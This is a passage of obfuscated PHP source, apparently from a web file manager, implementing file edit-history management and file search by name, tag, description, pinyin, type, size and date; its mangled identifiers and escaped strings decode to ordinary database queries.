} Hook::trigger($ÀİË´Ï”[2122], $úÊÇĞ™Å); Model($ÀİË´Ï”[2123])->eventFileEdit($¶Ä“¨Ì[$ÀİË´Ï”[431]]); } private function historyAutoClear($¸È€°€) { $¼á½éŠÀ =& $_SERVER[…É¦À–]; $¬ª¸™‡ú = Model($¼á½éŠÀ[810])->get($¼á½éŠÀ[1284]); $şêóø· = $GLOBALS[$¼á½éŠÀ[6]][$¼á½éŠÀ[89]][$¼á½éŠÀ[1262]]; $ïŒö¬‘™ = $¬ª¸™‡ú == $¼á½éŠÀ[1285] ? min(5, $şêóø·) : $şêóø·; $ïŒö¬‘™ = $ïŒö¬‘™ <= 0 ? 0 : $ïŒö¬‘™ - 1; if ($ïŒö¬‘™ >= 500) { return; } $ô˜ìÅ•Ó = array($¼á½éŠÀ[446] => $¸È€°€); $Â‰Î‡Æ§ = $this->field($¼á½éŠÀ[2124])->where($ô˜ìÅ•Ó)->order($¼á½éŠÀ[2118])->select(); if (!$Â‰Î‡Æ§ || $ïŒö¬‘™ >= count($Â‰Î‡Æ§)) { return; } $¥Âß“ºİ = array_to_keyvalue($Â‰Î‡Æ§, $¼á½éŠÀ[12], $¼á½éŠÀ[428]); $¥Âß“ºİ = array_slice($¥Âß“ºİ, $ïŒö¬‘™); $Ğ½ìÍÙ = array_to_keyvalue($Â‰Î‡Æ§, $¼á½éŠÀ[12], $¼á½éŠÀ[497]); $Ğ½ìÍÙ = array_slice($Ğ½ìÍÙ, $ïŒö¬‘™); if (!$¥Âß“ºİ || !$Ğ½ìÍÙ) { return; } $ô˜ìÅ•Ó = array($¼á½éŠÀ[448] => array($¼á½éŠÀ[7], $¥Âß“ºİ)); $this->where($ô˜ìÅ•Ó)->delete(); Model($¼á½éŠÀ[500])->remove($Ğ½ìÍÙ); } public function listData($…Ÿüß²) { $ØÆÖíÑé =& $_SERVER[…É¦À–]; $¯ö»®¤ = array($ØÆÖíÑé[446] => $…Ÿüß²); $¨×†ÅÓØ = $ØÆÖíÑé[2125]; $É¶÷ä™³ = $this->field($¨×†ÅÓØ)->where($¯ö»®¤)->order($ØÆÖíÑé[2118])->selectPage(); $this->_listAppendUser($É¶÷ä™³[$ØÆÖíÑé[398]]); $ŠºÇ¥§œ = Model($ØÆÖíÑé[810])->get($ØÆÖíÑé[1284]); $º†Àãµ¿ = 5; if ($ŠºÇ¥§œ == $ØÆÖíÑé[1285]) { $É¶÷ä™³[$ØÆÖíÑé[398]] = array_slice($É¶÷ä™³[$ØÆÖíÑé[398]], 0, $º†Àãµ¿); $É¶÷ä™³[$ØÆÖíÑé[395]] = array($ØÆÖíÑé[2126] => 1, $ØÆÖíÑé[2127] => 20, $ØÆÖíÑé[2128] => 1, $ØÆÖíÑé[2129] => count($É¶÷ä™³[$ØÆÖíÑé[398]])); } return $É¶÷ä™³; } protected function _listAppendUser(&$Íî€†¬) { $ñ£‚‰Öñ =& $_SERVER[…É¦À–]; $š™İşª = array_to_keyvalue($Íî€†¬, $ñ£‚‰Öñ[12], $ñ£‚‰Öñ[1687]); $ÒçªŒÔ‰ = Model($ñ£‚‰Öñ[554])->userListInfo($š™İşª); foreach ($Íî€†¬ as &$»ŒòİÒ) { $óŒ…Œé = $»ŒòİÒ[$ñ£‚‰Öñ[1687]]; $»ŒòİÒ[$ñ£‚‰Öñ[483]] = $ÒçªŒÔ‰[$óŒ…Œé] ? $ÒçªŒÔ‰[$óŒ…Œé] : !1; } unset($»ŒòİÒ); } public function fileInfo($¡á¹ŸáÓ) { $ßÔ˜Èæ =& $_SERVER[…É¦À–]; $Ú‚¹ˆÆ… = $this->tablePrefix; $ñˆ”¢»¯ = "{$Ú‚¹ˆÆ…}\151\157\x5f\x66\x69\154\145\x20\146\x69\x6c\x65\x73\40\157\156\x20\146\x69\x6c\x65\x73\56\x66\151\x6c\x65\x49\x44\40\x3d\40\150\x69\x73\164\x6f\x72\x79\x2e\146\151\154\145\111\x44"; return $this->alias($ßÔ˜Èæ[2130])->where(array($ßÔ˜Èæ[448] => $¡á¹ŸáÓ))->join($ñˆ”¢»¯, $ßÔ˜Èæ[2131])->find(); } public function removeItem($·ğ„›çÀ) { $“¨ É— =& $_SERVER[…É¦À–]; $©µ´âƒ = array($“¨ É—[448] => $·ğ„›çÀ); $•¸˜Úè = $this->where($©µ´âƒ)->find(); if ($•¸˜Úè) { $’Ğí”ğ = $this->where($©µ´âƒ)->delete(); Model($“¨ É—[500])->remove($•¸˜Úè[$“¨ É—[497]]); return $’Ğí”ğ; } return !1; } public function removeBySource($à´Ô¸ûí) { $±•¢áÛ„ =& $_SERVER[…É¦À–]; if (!$à´Ô¸ûí) { return !1; } if (!is_array($à´Ô¸ûí)) { $à´Ô¸ûí = array($à´Ô¸ûí); } $ÛÃ‰ÌÕƒ = array($±•¢áÛ„[446] => array($±•¢áÛ„[7], $à´Ô¸ûí)); $ø£Âïû = $this->field($±•¢áÛ„[498])->where($ÛÃ‰ÌÕƒ)->select(); if ($ø£Âïû) { $this->where($ÛÃ‰ÌÕƒ)->delete(); $·¶æìÛİ = array_to_keyvalue($ø£Âïû, $±•¢áÛ„[12], $±•¢áÛ„[497]); Model($±•¢áÛ„[500])->remove($·¶æìÛİ); } return !0; } public function setDetail($‘ŸîÍ×æ, $õ‰„”÷Ï) { $˜áøæÈ =& $_SERVER[…É¦À–]; return $this->where(array($˜áøæÈ[448] => $‘ŸîÍ×æ))->save(array($˜áøæÈ[2121] => $õ‰„”÷Ï)); } public function rollbackToItem($ôîÓì, $ìÓñÆ¥İ) { $«äã—ÅÅ =& $_SERVER[…É¦À–]; $¦É±Şå¤ = Model($«äã—ÅÅ[865])->sourceInfo($ôîÓì); $this->addHistory($¦É±Şå¤, LNG($«äã—ÅÅ[2132])); $ÎåÃ”ßû = $this->find($ìÓñÆ¥İ); $†åöÖ†î = array($«äã—ÅÅ[497] => $ÎåÃ”ßû[$«äã—ÅÅ[497]], $«äã—ÅÅ[76] => $ÎåÃ”ßû[$«äã—ÅÅ[76]], $«äã—ÅÅ[85] => time(), $«äã—ÅÅ[485] => USER_ID); Model($«äã—ÅÅ[865])->where(array($«äã—ÅÅ[431] => $ôîÓì))->save($†åöÖ†î); return $this->where(array($«äã—ÅÅ[448] => $ìÓñÆ¥İ))->delete(); } public function clearSame($àã¼Ï€ø) { $¯ôëñğ¬ =& $_SERVER[…É¦À–]; $í÷»şå = $this->listData($àã¼Ï€ø); $Û—¼£¾û = array_to_keyvalue_group($í÷»şå, $¯ôëñğ¬[497]); $­àûšçÒ = array(); $°¨ùÒıÅ = array(); foreach ($Û—¼£¾û as $ òí®¦‘) { if (!$ òí®¦‘ || count($ òí®¦‘) <= 1) { continue; } foreach ($ òí®¦‘ as $ŸÇ¼İôì) { $­àûšçÒ[] = $ŸÇ¼İôì[$¯ôëñğ¬[497]]; $°¨ùÒıÅ[] = $ŸÇ¼İôì[$¯ôëñğ¬[428]]; } } if (!$°¨ùÒıÅ) { return; } $this->where(array($¯ôëñğ¬[428] => array($¯ôëñğ¬[7], $°¨ùÒıÅ)))->delete(); Model($¯ôëñğ¬[500])->remove($­àûšçÒ); } public function userSpace() { $Úµï²ğò =& $_SERVER[…É¦À–]; $ì´õëë£ = $this->tablePrefix; $É€ãåÏ = array($Úµï²ğò[1678] => USER_ID); $‡ÛÏ¬À = "{$ì´õëë£}\x69\x6f\x5f\x66\x69\x6c\145\40\146\x69\x6c\x65\x73\x20\157\x6e\40\x66\x69\x6c\145\163\56\x66\x69\154\x65\111\104\40\75\x20\x68\x69\x73\x74\x6f\162\171\56\146\x69\x6c\145\111\x44"; return $this->alias($Úµï²ğò[2130])->where($É€ãåÏ)->join($‡ÛÏ¬À, $Úµï²ğò[2131])->sum($Úµï²ğò[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¨¨ƒ‘õ›) { $´¢‚õÜä =& $_SERVER[…É¦À–]; $Á£’‹† = KodIO::fileTypeList(); $ÜÑ›Ù£ = $Á£’‹†[$¨¨ƒ‘õ›]; if (!$ÜÑ›Ù£) { return array(); } $¸ÒÆíÏ = $ÜÑ›Ù£[$´¢‚õÜä[174]]; $š¹ÛŠÚ = $´¢‚õÜä[7]; if (!$ÜÑ›Ù£[$´¢‚õÜä[174]]) { $°®ı³ˆô = array_to_keyvalue($Á£’‹†, $´¢‚õÜä[12], $´¢‚õÜä[174]); $¸ÒÆíÏ = implode($´¢‚õÜä[50], $°®ı³ˆô); $š¹ÛŠÚ = $´¢‚õÜä[2133]; } $™Â¤á­Œ = explode($´¢‚õÜä[50], trim($¸ÒÆíÏ, $´¢‚õÜä[50])); return array($š¹ÛŠÚ, $™Â¤á­Œ); } public function listPathType($Åô°¥Ñ­) { $ß¬ô× =& $_SERVER[…É¦À–]; $¼™Ô÷µ = $this->fileTypeWhere($Åô°¥Ñ­); if (!$¼™Ô÷µ) { return array(); } $ÖÕ§áß› = USER_ID; $±¢Ñ£‹„ = Model($ß¬ô×[554])->getInfo($ÖÕ§áß›); $ˆÛÒÓÚè = array($ß¬ô×[605] => SourceModel::TYPE_USER, $ß¬ô×[540] => array($ß¬ô×[569], $ß¬ô×[550] . $±¢Ñ£‹„[$ß¬ô×[87]][$ß¬ô×[431]] . $ß¬ô×[570]), $ß¬ô×[606] => $ÖÕ§áß›, $ß¬ô×[603] => 0, $ß¬ô×[604] => $¼™Ô÷µ); return $this->listSource($ˆÛÒÓÚè); } public function listSearch($­ÑÚ¥„ƒ, $ë¨±±ù = 300) { $™¹åùâã =& $_SERVER[…É¦À–]; if (isset($­ÑÚ¥„ƒ[$™¹åùâã[1971]]) && $­ÑÚ¥„ƒ[$™¹åùâã[1971]]) { $­ÑÚ¥„ƒ[$™¹åùâã[1971]] = str_replace($™¹åùâã[413], $™¹åùâã[2134], trim($­ÑÚ¥„ƒ[$™¹åùâã[1971]])); } $òú«éï’ = $this->_parseSearchWhere($­ÑÚ¥„ƒ); if (!isset($òú«éï’[$™¹åùâã[460]])) { $òú«éï’[$™¹åùâã[460]] = 0; } $£ˆÌÒÀ  = $™¹åùâã[2135]; $“Ó¹¯Ş = $òú«éï’; $æ‘÷‡šî = $£ˆÌÒÀ ; $this->_listSearchBindPinyin($­ÑÚ¥„ƒ, $òú«éï’, $£ˆÌÒÀ ); $this->alias($™¹åùâã[475])->_makeOrder(); $òú«éï’ = $this->parseWhereLike($òú«éï’); $’Ù±Ó¯É = $this->distinct(!0)->field($£ˆÌÒÀ )->where($òú«éï’)->selectPage($ë¨±±ù); if ($GLOBALS[$™¹åùâã[6]][$™¹åùâã[410]][$™¹åùâã[411]] && Input::check($­ÑÚ¥„ƒ[$™¹åùâã[1971]], $™¹åùâã[612]) && $’Ù±Ó¯É[$™¹åùâã[395]][$™¹åùâã[382]] == 1 && $’Ù±Ó¯É[$™¹åùâã[395]][$™¹åùâã[396]] == 0) { $’Ù±Ó¯É = $this->distinct(!0)->field($£ˆÌÒÀ )->where($“Ó¹¯Ş)->limit(1000)->select(); $’Ù±Ó¯É = array_page_split($’Ù±Ó¯É, !1, $ë¨±±ù); } $this->_listSearchFileContent($’Ù±Ó¯É, $­ÑÚ¥„ƒ, $æ‘÷‡šî, $“Ó¹¯Ş); $this->_listSearchDesc($’Ù±Ó¯É, $­ÑÚ¥„ƒ, $æ‘÷‡šî); $this->_listSearchTag($’Ù±Ó¯É, $­ÑÚ¥„ƒ, $æ‘÷‡šî); $this->_listSearchGroupTag($’Ù±Ó¯É, $­ÑÚ¥„ƒ, $æ‘÷‡šî); $this->_listDataApply($’Ù±Ó¯É[$™¹åùâã[398]]); $this->_listMake($’Ù±Ó¯É); return $’Ù±Ó¯É; } private function _listSearchFileContent(&$‰»ØÓ˜ğ, $Û—É“›, $ë®Üµ•Æ, $¸¼öñŸ€) { $ÈŒ¾Í€Ò =& $_SERVER[…É¦À–]; if (!$Û—É“›[$ÈŒ¾Í€Ò[1971]] || $‰»ØÓ˜ğ[$ÈŒ¾Í€Ò[395]][$ÈŒ¾Í€Ò[382]] > 1) { return; } if (!isset($¸¼öñŸ€[$ÈŒ¾Í€Ò[32]]) || !is_array($Û—É“›[$ÈŒ¾Í€Ò[497]])) { return; } $¸¼öñŸ€[$ÈŒ¾Í€Ò[497]] = array($ÈŒ¾Í€Ò[7], $Û—É“›[$ÈŒ¾Í€Ò[497]]); unset($¸¼öñŸ€[$ÈŒ¾Í€Ò[32]]); unset($Û—É“›[$ÈŒ¾Í€Ò[497]]); $‰ÛÍÁşü = $this->field($ë®Üµ•Æ)->where($¸¼öñŸ€)->limit($ÈŒ¾Í€Ò[2136])->select(); if (!$‰ÛÍÁşü || count($‰ÛÍÁşü) == 0) { return; } $‰»ØÓ˜ğ[$ÈŒ¾Í€Ò[398]] = array_merge($‰ÛÍÁşü, $‰»ØÓ˜ğ[$ÈŒ¾Í€Ò[398]]); $‰»ØÓ˜ğ[$ÈŒ¾Í€Ò[395]][$ÈŒ¾Í€Ò[396]] += count($‰ÛÍÁşü); } private function _listSearchTag(&$È¯â’üÊ, $ÕŠç¬¼, $Ğ’Óğş) { $ÒÀÍÛ‡ =& $_SERVER[…É¦À–]; if (!$ÕŠç¬¼[$ÒÀÍÛ‡[1971]] || $È¯â’üÊ[$ÒÀÍÛ‡[395]][$ÒÀÍÛ‡[382]] > 1) { return; } $œ§¾Ãø­ = Model($ÒÀÍÛ‡[2137])->listData(); $Òü´¬ûú = array(); $¸şÀˆ¼‡ = $ÕŠç¬¼[$ÒÀÍÛ‡[1971]]; foreach ($œ§¾Ãø­ as $œä±İÔ) { $÷¾ß¸ã = $œä±İÔ[$ÒÀÍÛ‡[32]]; $·£‚ÈÇ = str_replace($ÒÀÍÛ‡[53], $ÒÀÍÛ‡[12], Pinyin::get($÷¾ß¸ã)); if (stripos($÷¾ß¸ã, $¸şÀˆ¼‡) !== !1 || stripos($·£‚ÈÇ, $¸şÀˆ¼‡) !== !1) { $Òü´¬ûú[] = $œä±İÔ[$ÒÀÍÛ‡[428]]; } } if (!$Òü´¬ûú) { return; } $ş×ş¾™² = array($ÒÀÍÛ‡[455] => array($ÒÀÍÛ‡[7], $Òü´¬ûú), $ÒÀÍÛ‡[1687] => USER_ID); $ÏÖÊ¼­ç = Model($ÒÀÍÛ‡[457])->field($ÒÀÍÛ‡[84])->where($ş×ş¾™²)->select(); $ÏÖÊ¼­ç = array_to_keyvalue($ÏÖÊ¼­ç, $ÒÀÍÛ‡[12], $ÒÀÍÛ‡[84]); $¹İ’ Ğ = array_unique($ÏÖÊ¼­ç); $this->_listSearchMerge($È¯â’üÊ, $ÕŠç¬¼, $Ğ’Óğş, $¹İ’ Ğ); } private function _listSearchDesc(&$½ÆèÔ‰, $ÜËšÉ±¬, $°Š‚±¤Ï) { $¡ó†¿”Ñ =& $_SERVER[…É¦À–]; if (!$ÜËšÉ±¬[$¡ó†¿”Ñ[1971]] || $½ÆèÔ‰[$¡ó†¿”Ñ[395]][$¡ó†¿”Ñ[382]] > 1) { return; } $ƒ¯ƒÅ¿ = array($¡ó†¿”Ñ[94] => $¡ó†¿”Ñ[482], $¡ó†¿”Ñ[403] => array($¡ó†¿”Ñ[412], $¡ó†¿”Ñ[1973] . $ÜËšÉ±¬[$¡ó†¿”Ñ[1971]] . $¡ó†¿”Ñ[1973])); $úùëëŒÔ = !1; if ($úùëëŒÔ) { $õÇ…à¦± = $this->listSearchChildren($ÜËšÉ±¬[$¡ó†¿”Ñ[461]]); $õÇ…à¦± = array_unique($õÇ…à¦±); if (!$õÇ…à¦±) { return; } $ƒ¯ƒÅ¿[$¡ó†¿”Ñ[431]] = array($¡ó†¿”Ñ[7], $õÇ…à¦±); } $ÎÁ®êú¡ = Model($¡ó†¿”Ñ[589])->field($¡ó†¿”Ñ[431])->where($ƒ¯ƒÅ¿)->limit(5000)->select(); $ÓœùÜå = array_to_keyvalue($ÎÁ®êú¡, $¡ó†¿”Ñ[12], $¡ó†¿”Ñ[431]); $this->_listSearchMerge($½ÆèÔ‰, $ÜËšÉ±¬, $°Š‚±¤Ï, $ÓœùÜå); } private function _listSearchGroupTag(&$»„Ç¿Êè, $ßÖÏõŠì, $ª¼øïÏö) { $ÙËæ¸Üë =& $_SERVER[…É¦À–]; if (!$ßÖÏõŠì[$ÙËæ¸Üë[1971]] || $»„Ç¿Êè[$ÙËæ¸Üë[395]][$ÙËæ¸Üë[382]] > 1 || !$ßÖÏõŠì[$ÙËæ¸Üë[461]]) { return; } $¾úêµ¤ª = $this->sourceInfo($ßÖÏõŠì[$ÙËæ¸Üë[461]]); if (!$¾úêµ¤ª || $¾úêµ¤ª[$ÙËæ¸Üë[440]] != SourceModel::TYPE_GROUP) { return; } $åº·Úµß = $¾úêµ¤ª[$ÙËæ¸Üë[525]]; $’¶Ë´Ãƒ = Model($ÙËæ¸Üë[2138])->get($åº·Úµß); $Äª ñ™ = array(); $¢¥‰»úº = $ßÖÏõŠì[$ÙËæ¸Üë[1971]]; foreach ($’¶Ë´Ãƒ[$ÙËæ¸Üë[398]] as $â¦ïéÒ™) { $ÃºŠ• = $â¦ïéÒ™[$ÙËæ¸Üë[32]]; $¾…Ç‘±Ú = str_replace($ÙËæ¸Üë[53], $ÙËæ¸Üë[12], Pinyin::get($ÃºŠ•)); if (stripos($ÃºŠ•, $¢¥‰»úº) !== !1 || stripos($¾…Ç‘±Ú, $¢¥‰»úº) !== !1) { $Äª ñ™[] = $â¦ïéÒ™[$ÙËæ¸Üë[428]]; } } if (!$Äª ñ™) { return; } $Ô§›¦Óé = array($ÙËæ¸Üë[455] => array($ÙËæ¸Üë[7], $Äª ñ™), $ÙËæ¸Üë[1687] => 0, $ÙËæ¸Üë[33] => $ÙËæ¸Üë[1993] . $åº·Úµß); $º°õúò” = Model($ÙËæ¸Üë[457])->field($ÙËæ¸Üë[84])->where($Ô§›¦Óé)->select(); $º°õúò” = array_to_keyvalue($º°õúò”, $ÙËæ¸Üë[12], $ÙËæ¸Üë[84]); $©î¬ï¨à = array_unique($º°õúò”); $this->_listSearchMerge($»„Ç¿Êè, $ßÖÏõŠì, $ª¼øïÏö, $©î¬ï¨à); } private function _listSearchMerge(&$©¦ÉÏ´¯, $Ô„îÜî, $ì„—õ±×, $’Ò¹íÎ†) { $Œãí‚’£ =& $_SERVER[…É¦À–]; if (!$’Ò¹íÎ†) { return; } $Ã»£²Õ = array_to_keyvalue($©¦ÉÏ´¯[$Œãí‚’£[398]], $Œãí‚’£[12], $Œãí‚’£[431]); $°¸¦Ä­Õ = array_diff($’Ò¹íÎ†, $Ã»£²Õ); if (!$°¸¦Ä­Õ) { return; } $Ú¼¸Âãƒ = array($Œãí‚’£[431] => array($Œãí‚’£[7], $°¸¦Ä­Õ)); $£‰ë†Ì = $this->field($ì„—õ±×)->where($Ú¼¸Âãƒ)->select(); if (!$£‰ë†Ì) { return; } $¦Å®ÒÇû = array(); foreach ($£‰ë†Ì as $¸°ü§œ—) { if ($this->_listSearchFilter($¸°ü§œ—, $Ô„îÜî)) { $¦Å®ÒÇû[] = $¸°ü§œ—; } } $©¦ÉÏ´¯[$Œãí‚’£[398]] = array_merge($¦Å®ÒÇû, $©¦ÉÏ´¯[$Œãí‚’£[398]]); $©¦ÉÏ´¯[$Œãí‚’£[395]][$Œãí‚’£[396]] += count($¦Å®ÒÇû); } private function _listSearchFilter($­Ğºåİ°, $µÃñù‘–) { $œ¾Ú·È =& $_SERVER[…É¦À–]; $øÜßÁÒ€ = $­Ğºåİ°[$œ¾Ú·È[439]] == $œ¾Ú·È[88]; if (!strstr($­Ğºåİ°[$œ¾Ú·È[540]], $œ¾Ú·È[50] . $µÃñù‘–[$œ¾Ú·È[461]] . $œ¾Ú·È[50])) { return !1; } if (isset($µÃñù‘–[$œ¾Ú·È[441]]) && $µÃñù‘–[$œ¾Ú·È[441]] != $œ¾Ú·È[1932]) { if ($µÃñù‘–[$œ¾Ú·È[441]] == $œ¾Ú·È[75] && !$øÜßÁÒ€) { return !1; } if ($µÃñù‘–[$œ¾Ú·È[441]] != $œ¾Ú·È[75] && $øÜßÁÒ€) { return !1; } if (!strstr($­Ğºåİ°[$œ¾Ú·È[174]], $œ¾Ú·È[50] . $µÃñù‘–[$œ¾Ú·È[441]] . $œ¾Ú·È[50])) { return !1; } } if (isset($µÃñù‘–[$œ¾Ú·È[2139]]) && $µÃñù‘–[$œ¾Ú·È[2139]] < $­Ğºåİ°[$œ¾Ú·È[76]]) { return !1; } if (isset($µÃñù‘–[$œ¾Ú·È[2140]]) && $µÃñù‘–[$œ¾Ú·È[2140]] > $­Ğºåİ°[$œ¾Ú·È[76]]) { return !1; } if (isset($µÃñù‘–[$œ¾Ú·È[619]]) && $µÃñù‘–[$œ¾Ú·È[619]] != $­Ğºåİ°[$œ¾Ú·È[485]]) { return !1; } return !0; } public function listSearchChildren($£´©İ³, $Ö×€´óñ = 5000) { $øËèÛ› =& $_SERVER[…É¦À–]; $Õ×è‡§ = array(); $åÛëŸ€ = $this->sourceInfo($£´©İ³); $¸ß±ÀÕÈ = array($øËèÛ›[540] => array($øËèÛ›[412], $åÛëŸ€[$øËèÛ›[540]] . $åÛëŸ€[$øËèÛ›[431]] . $øËèÛ›[570])); $´·¶ÖŒ¹ = $this->field($øËèÛ›[76])->where($¸ß±ÀÕÈ)->limit($Ö×€´óñ + 1)->select(); $°¬ÅëßØ = is_array($´·¶ÖŒ¹) ? count($´·¶ÖŒ¹) : 0; if ($°¬ÅëßØ > $Ö×€´óñ) { return $this->_listSearchChildrenNear($£´©İ³, $Ö×€´óñ); } $ÑÍÜç¬Î = $this->field($øËèÛ›[431])->where($¸ß±ÀÕÈ)->select(); $Õ×è‡§ = array_to_keyvalue($ÑÍÜç¬Î, $øËèÛ›[12], $øËèÛ›[431]); return $Õ×è‡§; } private function _listSearchChildrenNear($Ïı¢ìªÚ, $Åæ‘¤ìº) { $«é°¨”È =& $_SERVER[…É¦À–]; $¡„˜Ù‹– = array(); $Óãºœö› = array($«é°¨”È[461] => $Ïı¢ìªÚ); $¥áÖŸËú = $this->field($«é°¨”È[2141])->where($Óãºœö›)->select(); $®—Š˜Öñ = array_to_keyvalue(array_filter_by_field($¥áÖŸËú, $«é°¨”È[439], $«é°¨”È[88]), $«é°¨”È[12], $«é°¨”È[431]); $¡„˜Ù‹– = array_merge($¡„˜Ù‹–, array_to_keyvalue($¥áÖŸËú, $«é°¨”È[12], $«é°¨”È[431])); if (!$®—Š˜Öñ) { return $¡„˜Ù‹–; } $Óãºœö› = array($«é°¨”È[461] => array($«é°¨”È[7], $®—Š˜Öñ)); $¥áÖŸËú = $this->field($«é°¨”È[2141])->where($Óãºœö›)->limit($Åæ‘¤ìº)->select(); $¡„˜Ù‹– = array_merge($¡„˜Ù‹–, array_to_keyvalue($¥áÖŸËú, $«é°¨”È[12], $«é°¨”È[431])); $¡„˜Ù‹– = array_slice($¡„˜Ù‹–, 0, $Åæ‘¤ìº); return $¡„˜Ù‹–; } private function _listSearchBindPinyin($ŠÁò½çŸ, &$¶—ß–„«, &$›¾Ïğ§Ê) { $ÃÜƒ“Ş® =& $_SERVER[…É¦À–]; if (!isset($ŠÁò½çŸ[$ÃÜƒ“Ş®[1971]]) || !$ŠÁò½çŸ[$ÃÜƒ“Ş®[1971]]) { return; } if (!Input::check($ŠÁò½çŸ[$ÃÜƒ“Ş®[1971]], $ÃÜƒ“Ş®[347]) || strlen($ŠÁò½çŸ[$ÃÜƒ“Ş®[1971]]) < 2) { return; } $âå‹¾®â = "\114\x45\x46\x54\40\112\x4f\111\x4e\x20{$this->tablePrefix}\151\157\137\x73\157\165\x72\143\145\137\155\x65\x74\141\40\x6d\145\164\141\40\157\156\x20\x73\x6f\x75\162\143\x65\x2e\x73\157\165\x72\143\x65\111\104\40\x3d\40\155\145\164\141\56\x73\157\x75\x72\143\x65\x49\x44"; $×ÜÜÈ€ì = array(); $›¾Ïğ§Ê = str_replace(array($ÃÜƒ“Ş®[231], $ÃÜƒ“Ş®[53], $ÃÜƒ“Ş®[2142]), $ÃÜƒ“Ş®[12], $›¾Ïğ§Ê); $›¾Ïğ§Ê = $ÃÜƒ“Ş®[467] . str_replace($ÃÜƒ“Ş®[50], $ÃÜƒ“Ş®[468], $›¾Ïğ§Ê); $×÷±¤ƒò = $¶—ß–„«[$ÃÜƒ“Ş®[32]]; unset($¶—ß–„«[$ÃÜƒ“Ş®[32]]); foreach ($¶—ß–„« as $Ñ±ŸÆä => $¾˜‘ª”) { $×ÜÜÈ€ì[$ÃÜƒ“Ş®[467] . $Ñ±ŸÆä] = $¾˜‘ª”; } foreach ($×÷±¤ƒò as $ÁŞ´ìèÈ) { $×ÜÜÈ€ì[] = array($ÃÜƒ“Ş®[472] => $ÁŞ´ìèÈ, $ÃÜƒ“Ş®[1045] => $ÃÜƒ“Ş®[1975], array($ÃÜƒ“Ş®[2143] => $ÁŞ´ìèÈ, $ÃÜƒ“Ş®[2144] => array($ÃÜƒ“Ş®[7], array($ÃÜƒ“Ş®[494], $ÃÜƒ“Ş®[493])))); } $this->join($âå‹¾®â); $¶—ß–„« = $×ÜÜÈ€ì; } private function _parseSearchWhere($ë¡º©±) { $ı±‘Èä =& $_SERVER[…É¦À–]; $“ÍáÈ´æ = array(); if (isset($ë¡º©±[$ı±‘Èä[800]]) && $ë¡º©±[$ı±‘Èä[800]]) { $“ÍáÈ´æ[$ı±‘Èä[85]] = array($ı±‘Èä[2145], $ë¡º©±[$ı±‘Èä[800]]); } if (isset($ë¡º©±[$ı±‘Èä[801]]) && $ë¡º©±[$ı±‘Èä[801]]) { $Áú²’µ× = array($ı±‘Èä[2146], $ë¡º©±[$ı±‘Èä[801]]); if ($“ÍáÈ´æ[$ı±‘Èä[85]]) { $“ÍáÈ´æ[$ı±‘Èä[85]] = array($“ÍáÈ´æ[$ı±‘Èä[85]], $Áú²’µ×, $ı±‘Èä[2147]); } else { $“ÍáÈ´æ[$ı±‘Èä[85]] = $Áú²’µ×; } } if (isset($ë¡º©±[$ı±‘Èä[2139]]) && $ë¡º©±[$ı±‘Èä[2139]] > 0) { $“ÍáÈ´æ[$ı±‘Èä[76]] = array($ı±‘Èä[2145], $ë¡º©±[$ı±‘Èä[2139]]); } if (isset($ë¡º©±[$ı±‘Èä[2140]]) && $ë¡º©±[$ı±‘Èä[2140]]) { $Áú²’µ× = array($ı±‘Èä[2146], $ë¡º©±[$ı±‘Èä[2140]]); if ($“ÍáÈ´æ[$ı±‘Èä[76]]) { $“ÍáÈ´æ[$ı±‘Èä[76]] = array($“ÍáÈ´æ[$ı±‘Èä[76]], $Áú²’µ×, $ı±‘Èä[2147]); } else { $“ÍáÈ´æ[$ı±‘Èä[76]] = $Áú²’µ×; } } if (isset($ë¡º©±[$ı±‘Èä[619]]) && $ë¡º©±[$ı±‘Èä[619]]) { $“ÍáÈ´æ[] = array($ı±‘Èä[485] => $ë¡º©±[$ı±‘Èä[619]], $ı±‘Èä[483] => $ë¡º©±[$ı±‘Èä[619]], $ı±‘Èä[1045] => $ı±‘Èä[1975]); } if (isset($ë¡º©±[$ı±‘Èä[441]]) && $ë¡º©±[$ı±‘Èä[441]]) { $æøŞ‡¦× = $ë¡º©±[$ı±‘Èä[441]]; if ($æøŞ‡¦× == $ı±‘Èä[75]) { $“ÍáÈ´æ[$ı±‘Èä[439]] = 1; } else { if ($æøŞ‡¦× == $ı±‘Èä[2148]) { $“ÍáÈ´æ[$ı±‘Èä[439]] = 0; } else { if ($æøŞ‡¦×) { $æøŞ‡¦× = is_array($æøŞ‡¦×) ? $æøŞ‡¦× : explode($ı±‘Èä[50], $æøŞ‡¦×); $“ÍáÈ´æ[$ı±‘Èä[441]] = array($ı±‘Èä[447], $æøŞ‡¦×); $“ÍáÈ´æ[$ı±‘Èä[439]] = 0; } } } } $this->_parseSearchParent($ë¡º©±, $“ÍáÈ´æ); if (isset($ë¡º©±[$ı±‘Èä[1971]]) && trim($ë¡º©±[$ı±‘Èä[1971]])) { $¦İô‹¼º = trim($ë¡º©±[$ı±‘Èä[1971]]); $ùµŒéè = explode($ı±‘Èä[53], $¦İô‹¼º); if (strlen($¦İô‹¼º) > 2 && (substr($¦İô‹¼º, 0, 1) == $ı±‘Èä[118] && substr($¦İô‹¼º, -1) == $ı±‘Èä[118]) || substr($¦İô‹¼º, 0, 1) == $ı±‘Èä[58] && substr($¦İô‹¼º, -1) == $ı±‘Èä[58]) { $¦İô‹¼º = substr($¦İô‹¼º, 1, -1); $ùµŒéè = array($¦İô‹¼º); } $“ÍáÈ´æ[$ı±‘Èä[32]] = array(array($ı±‘Èä[569], $ı±‘Èä[1973] . $¦İô‹¼º . $ı±‘Èä[1973])); if (count($ùµŒéè) > 1) { $“ÍáÈ´æ[$ı±‘Èä[32]] = array(); foreach ($ùµŒéè as $Œ» ¼Œë) { if (!trim($Œ» ¼Œë)) { continue; } $“ÍáÈ´æ[$ı±‘Èä[32]][] = array($ı±‘Èä[569], $ı±‘Èä[1973] . trim($Œ» ¼Œë) . $ı±‘Èä[1973]); } } } return $“ÍáÈ´æ; } private function _parseSearchParent($°’œ‹¿ï, &$ë ¹ó–©) { $Šä²äŞ¸ =& $_SERVER[…É¦À–]; if (!isset($°’œ‹¿ï[$Šä²äŞ¸[461]]) || !$°’œ‹¿ï[$Šä²äŞ¸[461]]) { return; } $âå¥óŒ­ = $this->pathInfo($°’œ‹¿ï[$Šä²äŞ¸[461]]); $÷¾ÆÓÙ = $âå¥óŒ­[$Šä²äŞ¸[461]] . $Šä²äŞ¸[12] === $Šä²äŞ¸[198]; $€çµÈ–Ë = $âå¥óŒ­[$Šä²äŞ¸[440]] == $Šä²äŞ¸[534]; if ($âå¥óŒ­[$Šä²äŞ¸[551]] == 